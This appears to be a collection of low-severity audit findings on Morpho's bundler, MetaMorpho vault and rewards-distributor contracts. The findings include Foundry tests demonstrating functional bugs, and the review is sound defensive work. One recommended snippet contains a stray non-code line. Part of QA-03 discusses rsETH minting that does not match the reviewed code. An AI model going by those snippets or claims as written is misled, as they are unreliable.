The [AaveV3OptimizerMigrationBundler](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3OptimizerMigrationBundler.sol#L81) uses signatures to allow users give the bundler authority to manage AaveV3 positions, [PermitBundler](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L22) allows users to give the bundler the authority to transfer their tokens, [MorphoBundler](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L65) uses it to allow users to give the bundler authority to manage Morpho Blue positions, [Permit2Bundler](url) allows users to give the bundler the authority to transfer their tokens via [Permit2](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L28) and UrdBundler allows users to prove they are eligible to receive rewards with a Merkle proof. 

Each of these bundler functions also has a `skipRevert` parameter. From the Natspec, this parameter allows the bundler to skip reverting if the signature is frontrunned. 

```
    /// @param skipRevert Whether to avoid reverting the call in case the signature is frontrunned.
    function permit(address asset, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, bool skipRevert)
        external
        payable
        protected
    {
        try IERC20Permit(asset).permit(initiator(), address(this), amount, deadline, v, r, s) {}
        catch (bytes memory returnData) {
            if (!skipRevert) _revert(returnData);
    }

```

The snippet above is from the PermitBundler. If the `skipRevert` argument is true, the failed call to the tokens `permit` function caught in the `catch` statement isn't reverted because it is assumed to have been frontrunned. If it is frontrunned it means the permission has already been given and can be skipped.

But the call to permit can fail for many reasons other than `frontrunning`. E.g invalid signature, passed deadline, insufficient gas etc. 

- Impact
If a call fails for other reasons than frontrunning, then subsequent calls in the bundle that depend on that call passing will fail. E.g if the permit call to the token in PermitBundler reverts because of an invalid signature, then a subsequent call that needs the Bundler to transfer the user's funds will fail. This wastes gas since the transaction could have been halted earlier.

- POC

This POC uses PermitBundler to permit the bundler to spend an amount of `user` tokens with an invalid signature. The bundle is executed successfully but permission isn't given.

```
    function testInvalidSig() public {
        uint256 amount = 9625200010104752831;
        uint256 deadline = block.timestamp + 1;
        uint256 privateKey = uint160(4);

        address user = vm.addr(privateKey);

        // send fake signature and skip revert
        bundle.push(abi.encodeCall(PermitBundler.permit, (address(permitToken), amount, deadline, uint8(0), bytes32(""), bytes32(""), true)));

        vm.prank(user);
        bundler.multicall(bundle);

        assertEq(permitToken.allowance(user, address(bundler)), 0);
    }
```

- Recommendation
When the call reverts, check if the intended action is done correctly before deciding to skip.

```
    function permit(address asset, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, bool skipRevert)
        external
        payable
        protected
    {
Permit2Bundler:approve2, aaveV3OptimizerApproveManagerWithSig
        try IERC20Permit(asset).permit(initiator(), address(this), amount, deadline, v, r, s) {}
        catch (bytes memory returnData) {

            if (!skipRevert) _revert(returnData);
            else {
                if(IERC20(asset).allowance(initiator(), address(this)) == amount) return;
                _revert(returnData);
            }
        }
    }
```




### ERC4626 Functions Should Revert

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

According to the OZ ERC4626 implementation the functions deposit() , mint() , withdraw() , redeem() should revert on the conditions specified in the interface here https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC4626.sol

MetaMorpho contract implementation of ERC4626 does not revert for the above functions which makes it non-compatible with ERC4626 and for the protocols that will build on top of it.



### Have A Different Role For Force Updating A Root

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

In the function setRoot() the root can be force updated (the regular flow is submitting a root(by the updator) and then accepting the root after the appropriate time).

https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L143

The privileges required for the regular root update and the force  update are same i.e.  onlyUpdator role

This is not ideal , the same address can force update or regular update . In an ideal state the force update should be done by a different role.

Recommendation:

Have a different role that can call the setRoot() function



### Transfer Of Ownership Should Be A Two Step Process	_(duplicate of [Make setting a new owner a two step process])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

The transfer of ownership should be a two step process , this is because if while updating to a new owner address mistakenly the incorrect address is provided then the ownership is lost forever and all the functions that require the owner's approval are invalidated  , making the protocol useless.

Make this functionality https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L172 into a two step process where in the first process a new owner is chosen (a pending new owner) and in the second step the new owner has to accept the ownership.

Recommendation:

Have a two step owner transfership mechanism.



### QA Report (Covering all Low Severity or informational findings)

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


- Table of Contents

| Issue ID                                                                           | Description                                                                                                                           |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| QA-01 | `AaveV2MigrationBundler.sol` calls a non-payable function with potential Ether attached, posing a risk of fund loss.                  |
| QA-02      | The `ICEth` & `ICToken` interfaces should also support the `exchangeRateCurrent()` function for accurate price reflection.            |
| QA-03           | Multiple issues with how external protocols are integrated into Morpho, affecting the pricing functionality.                          |
| QA-04                         | Pure ERC20 compliant tokens might not work with the protocol due to missing or different format implementations of certain functions. |
| QA-05      | `CompoundV3MigrationBundler` ETH Integration Oversight, lacking specific handling for Ethereum transactions in Compound V3.           |
| QA-06                                      | `_approveMaxTo()` does not work with all tokens, leading to approval issues for some assets.                                          |
| QA-07                      | The `require(answer >= 0)` check for Chainlink price is redundant if the feed is not for a real-world asset.                          |
| QA-08                            | Incomplete documentation regarding the roles required for accessing certain functions, leading to possible misinterpretations.        |


- QA-01`AaveV2MigrationBundler.sol` calls a non-payable function with potential Ether attached, posing a risk of fund loss

- Proof of Concept

The issue is evident in the following code snippets from the contract:

```solidity
function aaveV2Repay(address asset, uint256 amount, uint256 interestRateMode) external payable protected {
    // ...
    AAVE_V2_POOL.repay(asset, amount, interestRateMode, initiator());
}

function aaveV2Withdraw(address asset, uint256 amount) external payable protected {
    AAVE_V2_POOL.withdraw(asset, amount, address(this));
}
```

These functions are `payable` and can receive Ether, but the Aave V2 functions they call (`repay` and `withdraw`) do not handle Ether, creating a risk of fund loss.

- Impact

Navigating here we can see that both aave v2 withdrawals and repays are not payable https://github.com/aave/protocol-v2/blob/ce53c4a8c8620125063168620eba0a8a92854eb8/contracts/protocol/lendingpool/LendingPool.sol.

But the `aaveV2Repay` and `aaveV2Withdraw` functions in the `AaveV2MigrationBundler` contract could lead to potential loss of Ether. These functions are marked as `payable` but call non-payable functions in the Aave V2 protocol. This mismatch may result in users inadvertently sending Ether with their transactions, believing it will be used in the operation, only to lose these funds.

- Recommended Mitigation Steps

Eliminate the `payable` modifier from the `aaveV2Repay` and `aaveV2Withdraw` functions to prevent users from sending Ether along with these transactions.

Implement checks to ensure that no Ether is being sent with these transactions. Transactions should revert if Ether is detected to prevent loss of funds.

- QA-02 The `ICEth` & `ICToken` interfaces should also support the `exchangeRateCurrent()` function for accurate price reflection

- Proof of Concept

Take a look at `exchangeRateStored()`

```solidity
//@audit
    function exchangeRateStored() external view returns (uint256);
```

The above is the only function in regards to exchange rate that's present in the interface, but using this means that there would be a difference between the real price and what's returned.

- Impact

Inability to get what the real current price is.

- Recommended Mitigation Steps

Add support for the `exchangeRateCurrent()` function too.

- QA-03 Multiple issues with how external protocols are integrated into Morpho, affecting the pricing functionality

- Proof of Concept

Take a look at [getAssetPrice()](https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/libraries/ChainlinkDataFeedLib.sol#L20-L27), key to note that this eventually gets called for any query for prices, jsut as it's name suggests

```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;
    //@audit
        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

Issue with this, is that there [asides the already commented cases](https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/libraries/ChainlinkDataFeedLib.sol#L13-L19C1) just above this function, there are multiple safe checks to apply while querying prices from oracles or in this case Chainlink that's not being done, below a few are listed:

- Querying prices is not done in a try/catch format.
  This could break the protocol's staking/depositing implementations, as while getting the current RSETH/ETH exchange rate, the function loops through the supported assets checking for their prices and also the amount of assets present, obviously leading to an issue whenever one of the queries to get the prices reverts.
- No circuit break checkers
  This could lead to an issue where the amount of rsETH being minted is either very undervalued or overvalued, due to the price feed return these border prices even if the price is really outside the min/max circuit breakers.

  > Where as this comment has been made, `The price is not checked to be in the min/max bounds because it's assumed that the Chainlink feed keeps its promises on this.` protocol doesn't do anything to protect this, if we assume Chainlink would keep it's promises on this then that means that whenever the asset's price go below the allowed boundaries, Chainlink would keep it's promises and return the boundary prices

- Impact

Any of the below listed issues going through massively faults the whole pricing functionality of the protocol.

- Recommended Mitigation Steps

Ensure to correctly integrate external protocols, for e.g all fixes to issues that have been highlighted and more can be seen [here](https://medium.com/cyfrin/chainlink-oracle-defi-attacks-93b6cb6541bf).

- QA-04 Pure ERC20 compliant tokens might not work with the protocol due to missing or different format implementations of certain functions

- Proof of Concept

Take a look at [ERC20Wrapper.sol]()

```solidity
    //@audit
    function decimals() public view virtual override(ERC20, ERC20Wrapper) returns (uint8) {
        return ERC20Wrapper.decimals();
    }
```

It's well known that the `.name`, `.decimals` & `.symbol` are a addition to the ERC20 with some tokes not implementing these or having them in different fromats, what this leads to is a case where if the underlying asset doesn't support this then the call to this fails: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ef699fa6a224de863ffe48347a5ab95d3d8ba2ba/contracts/token/ERC20/extensions/ERC20Wrapper.sol#L36-L45.

- Impact

Non-compliance with pure ERC20 tokens.

- Recommended Mitigation Steps

Clearly document this mishap.

- QA-05 `CompoundV3MigrationBundler` ETH Integration Oversight, lacking specific handling for Ethereum transactions in Compound V3

- Proof of Concept

In the `compoundV3Repay` function, there is no explicit handling for cases where the asset is ETH (cETH in Compound V3). This is in contrast to the `CompoundV2MigrationBundler`, which includes specific logic for cETH, i.e the `if (cToken == C_ETH` check.

The absence of this consideration would cause the bundler to be unable to directly integrate with `CETH` tokens.

```solidity
    function compoundV3Repay(address instance, uint256 amount) external payable protected {
        address _initiator = initiator();
        address asset = ICompoundV3(instance).baseToken();

        amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
        amount = Math.min(amount, ICompoundV3(instance).borrowBalanceOf(_initiator));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        _approveMaxTo(asset, instance);

        // Compound V3 uses signed accounting: supplying to a negative balance actually repays the borrow position.
        ICompoundV3(instance).supplyTo(_initiator, asset, amount);
    }
```

- Impact

> Medium/Low

The `CompoundV3MigrationBundler` contract lacks specific handling for Ethereum (ETH) transactions, particularly for ETH-based debts in Compound V3. This omission would result in the inability to correctly integrate ETH debts directly through the contract, limiting its functionality and accessibility for users dealing with ETH in Compound V3.

- Recommended Mitigation Steps

Add specific logic in the `compoundV3Repay` function to handle ETH transactions. This should include checks to detect if the asset is ETH and process the transaction accordingly, using the contract's ETH balance just like has been done in the V2 bundler.

- QA-06 `_approveMaxTo()` does not work with all tokens, leading to approval issues for some assets

- Impact

Inability to make approvals for some assets

- Proof of Concept

Take a look at []()

```solidity
    /// @dev Gives the max approval to `spender` to spend the given `asset` if not already approved.
    /// @dev Assumes that `type(uint256).max` is large enough to never have to increase the allowance again.
    //@audit some tokens can't work with `type(uint256).max` approvals, which make instances where `_approveMaxTo()` is called to be inaccessible for these tokens
    function _approveMaxTo(address asset, address spender) internal {
        if (ERC20(asset).allowance(address(this), spender) == 0) {
            ERC20(asset).safeApprove(spender, type(uint256).max);
        }
    }
```

- Recommended Mitigation Steps

Either approve the real amount of tokens needed or outrightly state that these types of tokens are not supported.

- QA-07 The `require(answer >= 0)` check for Chainlink price is redundant if the feed is not for a real-world asset

- Proof of Concept

Take a look at `getPrice()`

```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;
    //@audit
        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

- Impact

Code's not at best structure cause the `require(answer >= 0)` check for chainlink price is redundant if the feed is not for a Real world asset say like oil where the price could be negative.

- Recommended Mitigation Steps

Safe to remove check.

- QA-08 Incomplete documentation regarding the roles required for accessing certain functions, leading to possible misinterpretations

- Proof of Concept

Take a look at 4 of some of the available modifiers.

```solidity
    /* MODIFIERS */

    /// @dev Reverts if the caller doesn't have the curator role.
    modifier onlyCuratorRole() {
        address sender = _msgSender();
        if (sender != curator && sender != owner()) revert ErrorsLib.NotCuratorRole();

        _;
    }

    /// @dev Reverts if the caller doesn't have the allocator role.
    modifier onlyAllocatorRole() {
        address sender = _msgSender();
        if (!isAllocator[sender] && sender != curator && sender != owner()) {
            revert ErrorsLib.NotAllocatorRole();
        }

        _;
    }

    /// @dev Reverts if the caller doesn't have the guardian role.
    modifier onlyGuardianRole() {
        if (_msgSender() != owner() && _msgSender() != guardian) revert ErrorsLib.NotGuardianRole();

        _;
    }

    /// @dev Reverts if the caller doesn't have the curator nor the guardian role.
    modifier onlyCuratorOrGuardianRole() {
        if (_msgSender() != guardian && _msgSender() != curator && _msgSender() != owner()) {
            revert ErrorsLib.NotCuratorNorGuardianRole();
        }

        _;
    }

```

As seen, all instances include comments within them of the `msg.sender` having a specific role or the query to use this reverts, i.e when it's been used in a function, problem with this is that all instances only attach in the comments that the callers must have the specific role but on checking code block we can see that actually all 4 modifiers wouldn't error out if it's an owner that's trying to access these functions, creating a false prretense protection for users that actually think that the owners should not have direct access to these functions.

> NB: The `onlyAllocatorRole` also has an additional `curator` check attached to it, which is in the lines of what's been reported here.

- Recommended Mitigation Steps

Either clearly document that these functions are available to the owners, or change the code block.




### ERC20WrapperBundler is missing the payable modifier	_(duplicate of [`ERC20WrapperBundler.erc20WrapperDepositFor` not payable])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description
Morpho Blue uses Bundlers to make interacting with Morpho Blue easy by combining many transactions done separately normally into a single one. E.g migrating a position from AAveV2 to Morpho Blue can be done in a single transaction by using the Bundlers. 

A single contract inherits the Bundlers and the BaseBundler contract. Calls are done by calling the multicall function on the contract.

```
    function multicall(bytes[] memory data) external payable {
        require(_initiator == UNSET_INITIATOR, ErrorsLib.ALREADY_INITIATED);

        _initiator = msg.sender;

        _multicall(data);

        _initiator = UNSET_INITIATOR;
    }
```

Each element in the data parameter contains calldata which contain the function selector and function arguments. [multicall](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L51) calls [_multicall](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L65) which executes each calldata by calling `delegatecall` on its contract (`address(this)`). 

```
    function _multicall(bytes[] memory data) internal {
        for (uint256 i; i < data.length; ++i) {
            // @audit why do a delegatecall?
            (bool success, bytes memory returnData) = address(this).delegatecall(data[i]);

            // No need to check that `address(this)` has code in case of success.
            if (!success) _revert(returnData);
        }
    }
```

This allows the calldata to select the bundler function it wants to call automatically. It also maintains the `msg.value` and `msg.caller` from the initial call. Since it maintains the `msg.value`, and calls will cut across multiple bundlers, each Bundlers function to be called by multicall should be payable.  This enables it to be combined with any other function that requires the native token to be available in the contract. For value to be present, it may have to be sent through `msg.value`.

This information is also included in the Natspec:
```
    /// @dev All functions delegatecalled must be `payable` if `msg.value` is non-zero.
    function multicall(bytes[] memory data) external payable {
        require(_initiator == UNSET_INITIATOR, ErrorsLib.ALREADY_INITIATED);
    ...
```

But the functions [erc20WrapperDepositFor](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC20WrapperBundler.sol#L30) and [erc20WrapperWithdrawTo](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC20WrapperBundler.sol#L47) in ERC20WrapperBundler do not have the `payable` modifier.

- Impact
This prevents the functions from being combined with other functions that require value to be present in the main Bundler contract. For value to be present, it may have to be sent through `msg.value`.
This prevents users from creating some bundles.

- Proof Of Concept
This POC tries to combine a native transfer with the `erc20WrapperWithdrawTo` function.

```
    function testErc20WrapperXNativeTransfer(uint256 amount) public {
        amount = bound(amount, MIN_AMOUNT, MAX_AMOUNT);

        // set token balances
        loanWrapper.setBalance(address(bundler), amount);
        loanToken.setBalance(address(loanWrapper), amount);
        
        // set native token balance
        deal(address(this), amount);

        // create bundles
        bundle.push(_erc20WrapperWithdrawTo(address(loanWrapper), RECEIVER, amount));
        bundle.push(_nativeTransfer(RECEIVER, amount));
        
        vm.expectRevert("call failed");
        // send bundle
        bundler.multicall{value: amount}(bundle);
    }
```


- Recommendation
Add a `payable` modifier to the ERC20WrapperBundler functions.



### Metamorpho owner cannot easily reset the timelock for a pending value.

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Desciption
Metamorpho allows the owner role to submit timelocks and guardians while the supply caps are submitted by curators. These values can be set as pending values which will be able to come into effect after some time. This time it takes to come into effect depends on the current `timelock` state variable.

The timelock of a pending value may need to be extended if a new `timelock` comes into effect and users want it to use the new timelock or the owner/curator believes that more time is needed before the pending value comes into effect.

But the owner/curator cannot easily do this because of these checks:

**Timelock check**
```
if (newTimelock == pendingTimelock.value) revert ErrorsLib.AlreadyPending();
```
**Guardian check**
```
if (pendingGuardian.validAt != 0 && newGuardian == pendingGuardian.value) {
    revert ErrorsLib.AlreadyPending();
}
```
**Supply cap check**
```
if (newSupplyCap == pendingCap[id].value) revert ErrorsLib.AlreadyPending();
```

When he tries to submit the same value as the current pending value this checks will cause the call to revert.

- Impact
The owner/curator has to first reset the pending value to a different value before changing it to the initial value he needs. This wastes time and gas fees.

- Recommendation
The current implementation prevents the owner/curator from changing the pending value to the same value. But this should rarely happen as the owner/curator would check the value and decide to change it based on what he sees as the current value. Even if he changes the value by mistake he'll only increase the time it takes to come into effect.

Allow pending values to be set again to their current value to increase their timelocks.



### msg.value is not preserved across contexts

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
Morpho Bundler allows users to conduct a flash loan with Morpho. When a flash loan occurs in Morpho, Morpho callsback the msg.sender. For a user using Morpho Bundler, the msg.sender will be the Morpho Bundler contract.  

When this flash loan callback occurs, the context msg.value is set to zero since the EVM would consider this a new call. This is problematic as Morpho should maintain the same msg.value across all calls. This can lead to confusing behavior for the user and potentially failing transactions.

When the msg.value is not maintained, users will not be able to utilize the msg.value in follow-up transactions during the flash loan leading to either unexpected behavior or outright failed transactions.

This issue has also been found in previous reports regarding contracts that allow for bundling txs. The report can be found here: https://github.com/sherlock-audit/2023-05-ironbank-judging/blob/main/001-H/361.md

- Proof of Concept

1. User calls multicall() passing in 100 eth.
2. Multicall calls MorphoBundler.morphoLiquidate() which calls Morpho.liquidate()
3. Morpho.liquidate() makes a call to MorphoBundler. Here the msg.value is set back to zero.

- Tools Used
Eyes

- Recommended Mitigation Steps
The msg.value should be preserved across contexts. This may require Morpho to store the msg.value value at time of multicall() to preserve the msg.value state and deduct from it each time it's used.



### MorphoBundler does not check if other bundler contracts are targeted as onBehalf

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
Morpho plans to deploy several Bundler contracts. Because of this, Morpho when it is checking that it's own bundler address is not used in certain scenarios, should check against a list of deployed addresses, and not just `address(this)`.

For example, we can see this in MorphoBundler.morphoSupply() which on the first line checks that:

```solidity
// Do not check `onBehalf` against the zero address as it's done at Morpho's level.
require(onBehalf != address(this), ErrorsLib.BUNDLER_ADDRESS);
```

Since multiple bundler contracts are deployed, a user can set the onBehalf to a different Bundler contract. This is something Morpho likely does not want to happen.
 
- Tools Used
Eyes


- Recommended Mitigation Steps
The protocol should have a list of all deployed bundler contracts and check that onBehalf is never called against any Bundler contract, just not `address(this)`.



### StEthBundler doesn't check for slippage checks when wrapping/unwrapping StEth

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
The StEthBundler allows a user to both wrap and unwrap stEth to wstEth and vis versa. This wrapping/unwrapping is not a 1:1 ratio as the value of stEth -> wstEth is dependent on value of `sthEth.getSharesByPooledEth()`. 

If a user calls StEthBundler and they are the first transaction to call WstEth for a given block, the price ratio may be updated. Because of this unexpected change in the ratio and because the protocol does not allow for slippage checks, the user can receive less wstETH than expected.

- Proof of Concept
Below is the relevant code dealing with wrapping and unwrapping sthEth. As can be seen, the code does not contain slippage checks:

```solidity
    /// @notice Wraps the given `amount` of stETH to wstETH.
    /// @notice wstETH tokens are received by the bundler and should be used afterwards.
    /// @dev Initiator must have previously transferred their stETH tokens to the bundler.
    /// @param amount The amount of stEth to wrap. Pass `type(uint256).max` to wrap all.
    function wrapStEth(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(ST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        IWstEth(WST_ETH).wrap(amount);
    }

    /// @notice Unwraps the given `amount` of wstETH to stETH.
    /// @notice stETH tokens are received by the bundler and should be used afterwards.
    /// @dev Initiator must have previously transferred their wstETH tokens to the bundler.
    /// @param amount The amount of wstEth to unwrap. Pass `type(uint256).max` to unwrap all.
    function unwrapStEth(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(WST_ETH).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        IWstEth(WST_ETH).unwrap(amount);
    }
```


- Tools Used
Eyes

- Recommended Mitigation Steps
Allow the user to pass in a slippageCheck variable that is tested against how many wstEth were created.



### Consider Having A Mechanism If There Is Not Enough Liquidity In The Vault To Withdraw assets 	_(duplicate of [Metamorpho: DoS on `_withdrawMorpho` when `assets` is bigger than largest market position within the vault ])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

In the withdraw functionality of the MetaMorpho contract , https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585 the assets to withdraw are passed as the parameter , 
then `_withdraw` is called which calls the `_withdrawMorpho()` at L823

`_withdrawMorpho` calculates the withdrawable amount of assets at L830 going over the entire withdrawQueue  , and if the assets value in the end is not 0 it reverts , this is because if assets is not 0 it means more assets were meant to be transferred but there was not enough liquidity in the vault and the transaction reverts.

Consider having a extra variable which stores this extra amount (the remaining value of `assets`) and when there is liquidity in the vault the user can redeem the assets later.



### Mismatches with specification in bundlers and reward distributor contracts

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

There are some mismatches between the code and specification that should be corrected to avoid confusions and potential errors during operation of the system.

- In the `UniversalRewardsDistributor` contract

The README stats that:

> The claimable amount for a given user must always exceed the amount provided in the previous Merkle tree. If a claimer has claimed an amount higher than the `claimable` amount in the Merkle tree (if claimed from a previous root), **the claim will revert with a "root misconfigured" error**
> 

However, there’s no such error in the code. In the scenario described, the `UniversalRewardsDistributor::claim` function reverts with the `CLAIMABLE_TOO_LOW` error.

Note that this is correctly tested in the `UniversalRewardsDistributorTest.t.sol::testClaimShouldRevertIfRootMisconfigured` test. So it appears that the specification in the README file is just outdated.

- In the `MorphoBundler` contract

The docstrings for `MorphoBundler::morphoSetAuthorizationWithSig` state: `Approves this contract to manage the authorization.authorizer's position via EIP712 signature`. But this is not necessarily true, because the function doesn’t enforce it.

The authorized account will be whatever address the signer includes in the `authorized` field of the `authorization` struct.

To comply with the documentation, the code of the `MorphoBundler::morphoSetAuthorizationWithSig` function should verify that `authorization.authorized` matches `address(this)`. Or set it with `authorization.authorized = address(this)`.

- In the `Permit2Bundler` contract

The docstrings for `Permit2Bundler::approve2` state: `Approves the given amount of asset from the initiator to be spent by the bundler via Permit2 with the given deadline & EIP-712 signature`. But this is not necessarily true, because the function doesn’t enforce it.

The approved spender will be whatever address the initiator signs in the `spender` field of the `permitSingle` struct. To comply with the documentation, the code of `Permit2Bundler::approve2` should verify that `permitSingle.spender` matches `address(this)`. Or set it with `permitSingle.spender = address(this)`.

In this case, the current behavior can be particularly confusing because it presents a mismatch with how `PermitBundler::permit` works, where the spender is always set to `address(this)`.



### Removed market may be immediately re-added with outdated cap	_(duplicate of [Pending cap may push a previously removed market back to the withdrawQueue])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

The `MetaMorpho::updateWithdrawQueue` function is intended to change the existing withdrawal queue with a new permutation given in the `indexes` parameter. It’s also possible to remove markets with zero cap and no supply by not including them in the `indexes` array.

When a market is removed, its corresponding `config` is deleted from state. However, the market’s `pendingCap` is not deleted. As a consequence, a market that’s removed from the withdrawal queue but that had a supply cap submitted prior to being removed, could be re-added to the queue by simply calling `acceptCap` (as soon as the timelock’s passed). This will re-add the market to the queue, potentially with an outdated `cap` value, submitted prior to having decided to remove it from the withdrawal queue. Depending on the value of the `validAt` field for the market, this could happen immediately after the market is removed.

There are no tests, comments or external documentation describing this overlooked scenario, so it’s difficult to assess its impact in the protocol.

I suggest first specifying the behavior of the protocol for the described scenario, including tests and documentation. Then consider whether the `MetaMorpho::updateWithdrawQueue` function should be updated to delete any existing pending cap of removed markets.



### Deposits may unexpectedly fail for values indicated by ERC4626’s maxDeposit function, affecting bundled operations

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

There are at least two cases in which deposits can unexpectedly fail when calling the `MetaMorpho::deposit` function passing the value indicated by the getter `MetaMorpho::maxDeposit`.

These cases represent a strong deviation from the ERC4626 spec, where it is stated that:

> [The `maxDeposit` function] MUST return the maximum amount of assets `deposit` would allow to be deposited for `receiver` **and not cause a revert**
> 

Here’s the description and test scenarios for both cases.

- First case

When there are duplicate markets in the supply queue, the total suppliable amount of assets returned by `MetaMorpho::maxDeposit` will be erroneous. That is, it’ll return a value that, if attempted to be deposited by a user, will trigger a revert in the call to `MetaMorpho::deposit`.

This is because in `MetaMorpho::_maxDeposit`, the function accounts for each total suppliable amount of markets in the queue, regardless of whether the market appears more than once in it.

The following proof of concept shows how when a market appears twice in the queue, with a cap of 50 tokens, then `maxDeposit` returns 100 tokens. If the user attempts to supply 100 tokens, the transaction reverts.

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {stdError} from "../../lib/forge-std/src/StdError.sol";

import {SafeCast} from "../../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol";
import "./helpers/IntegrationTest.sol";

contract MarketTest is IntegrationTest {
  using MarketParamsLib for MarketParams;
  using MorphoLib for IMorpho;

  function setUp() public override {
      super.setUp();

      _setCap(allMarkets[0], CAP);
      _setCap(allMarkets[1], CAP);
      _setCap(allMarkets[2], CAP);
  }

	function test_spotcheck_maxDepositWrongValuesWhenQueueDuplicates() public {
    Id[] memory supplyQueue = new Id[](2);

    // set market[1] twice in the supply queue
    supplyQueue[0] = allMarkets[1].id();
    supplyQueue[1] = allMarkets[1].id();

    vm.expectEmit();
    emit EventsLib.SetSupplyQueue(ALLOCATOR, supplyQueue);
    vm.prank(ALLOCATOR);
    vault.setSupplyQueue(supplyQueue);

    uint256 cap = 50e18;
    _setCap(allMarkets[1], cap);

    uint256 maxDeposit = vault.maxDeposit(
        address(0) // irrelevant
    );
	
		// maxDeposit erroneously accounts twice
    // for the duplicated market in the queue
    assertEq(maxDeposit, cap * 2);

    loanToken.setBalance(SUPPLIER, maxDeposit);

    // The supplier attempts to supply the indicated `maxDeposit`, but fails
    vm.prank(SUPPLIER);
    vm.expectRevert(ErrorsLib.AllCapsReached.selector);
    vault.deposit(maxDeposit, RECEIVER);
  }
}
```

It's also worth mentioning that the docstrings for the `MetaMorpho::setSupplyQueue` function state that the supply queue `can contain duplicate markets, but it would ONLY increase the cost of depositing to the vault`. The described issue proves this statement false.


- Second case

In the following test case we use the default testing conditions set by the Morpho team, with two different markets in the supply queue.

Still, the call to `MetaMorpho::deposit` reverts with the `AllCapsReached` error when attempting to supply the value returned by `MetaMorpho::maxDeposit`. In this case, the problem actually comes from the fact that, when execution reaches `Morpho::supply`, either the supply amount or the calculated shares amount end up being larger than `type(uint128).max`, and internally trigger a revert with message `“max uint128 exceeded”`. This error is not seen without inspecting the internal traces because of the use of `try/catch` when calling `Morpho::supply`.

We’re aware that it can be argued that a user would never hold so many tokens, greatly lowering the probability of running into this case. Yet it’s important to highlight that the error showcases a strong inconsistency in the hard cap programmatically enforced by `Morpho::supply`, which is not respected by `MetaMorpho::maxDeposit`.

```
// Include this test in metamorpho/test/forge/ERC4626Test.sol
function testDepositMaxDepositAmount() public {
    uint256 assets = vault.maxDeposit(address(0));
    loanToken.setBalance(SUPPLIER, assets);

    vm.prank(SUPPLIER);
    vm.expectRevert(ErrorsLib.AllCapsReached.selector);
    vault.deposit(assets, ONBEHALF);
}
```

---

As seen, in both cases the deposit reverted when using the value returned by `maxDeposit`, contradicting what’s stated in the ERC4626 spec.

This behavior could also negatively impact other parts of Morpho. For example, the operation bundler contract `EthereumBundler`, which inherits from the `ERC4626Bundler` contract to include ERC4626-related operations 

In the `ERC4626Bundler::erc4626Deposit` function, the code calls the vault’s `MetaMorpho::maxDeposit` when determining the amount of assets to deposit. In the scenarios described above, if the `ERC4626Bundler::erc4626Deposit` function ends up using the value returned by `MetaMorpho::maxDeposit`, then the operation would fail. Which would prevent the whole bundle of operations from being executed — not just the deposit.

First and foremost, we'd recommend specifying the expected behavior of `maxDeposit` and how deposits should be expected to work when the value returned by `maxDeposit` is supplied. The behavior must abide to what's specificied in the ERC4626 spec.

